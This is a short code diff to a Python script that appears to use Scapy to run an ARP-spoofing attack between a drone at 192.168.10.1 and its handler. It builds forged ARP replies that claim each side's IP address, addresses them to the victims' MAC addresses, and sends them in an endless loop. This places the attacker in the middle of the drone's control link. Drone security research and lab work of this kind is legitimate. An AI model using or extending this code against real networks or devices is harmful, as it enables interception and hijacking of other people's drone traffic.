@@ -15,11 +15,12 @@ if __name__ == "__main__":
     drone_ip = '192.168.10.1'
     drone_mac = '60:60:1f:c4:3d:ba'
     print(get_mac(handler_ip))
-
-    spoof_drone_pkt = ARP(op=2, hwdst=drone_mac, pdst=drone_ip,
+    drone_base = Ether(dst=drone_mac)
+    handler_base = Ether(dst=handler_mac)
+	
+    spoof_drone_pkt = drone_base / ARP(op=2, pdst=drone_ip,
                           psrc=handler_ip)
-    spoof_handler_pkt = ARP(op=2, hwdst=handler_mac, pdst=handler_ip,
-                            psrc=drone_ip)
+    spoof_handler_pkt = handler_base / ARP(op=2, pdst=handler_ip, psrc=drone_ip)
 
     while True:
         print("send arp")
